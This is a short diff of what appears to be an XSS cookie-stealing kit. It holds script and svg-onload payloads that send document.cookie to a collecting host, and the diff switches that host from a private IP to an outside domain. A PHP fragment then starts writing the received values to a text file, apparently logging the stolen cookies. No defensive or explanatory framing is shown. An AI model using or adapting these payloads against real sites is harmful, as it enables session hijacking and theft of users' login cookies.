@@ -1,5 +1,5 @@
 <script>window.open("http://192.168.1.91/admin/xss.php?c="+document.cookie);//
-<svg/onload=location.href="http://192.168.1.91/xssGuestBook/admin/xss.php?c="+document.cookie//
+<svg/onload=location.href="https://lc4t.me/c.php?c="+document.cookie//
 
 <?
     $f = fopen("c.txt",'a+');
